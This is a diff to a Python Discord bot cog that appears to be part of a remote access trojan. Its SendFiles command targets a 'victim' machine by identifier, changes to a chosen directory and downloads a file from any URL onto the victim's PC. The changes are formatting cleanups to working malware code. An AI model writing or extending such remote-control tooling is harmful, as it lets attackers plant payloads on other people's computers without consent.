@@ -22,14 +22,14 @@ class SendFiles(commands.Cog):
         """
         if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
-            
+
             if '"' in file_path:
                 file_path = file_path.replace('"','')
             try: 
                 os.chdir(file_path)
             except: 
                 return await ctx.followup.send("Invalid directory!")
-            
+
             try:
                 r = requests.get(url, allow_redirects=True)
             except:
@@ -37,12 +37,12 @@ class SendFiles(commands.Cog):
 
             with open(file_name, "wb") as f: 
                 f.write(r.content)
-                
+
             await ctx.followup.send(
                 embed=self.bot.genEmbed(
-                    "File successfully sent to PC!", 
-                    datetime.now(), 
-                    "File path: " + file_path
+                    "File successfully sent to PC!",
+                    datetime.now(),
+                    f"File path: {file_path}",
                 )
             )
 
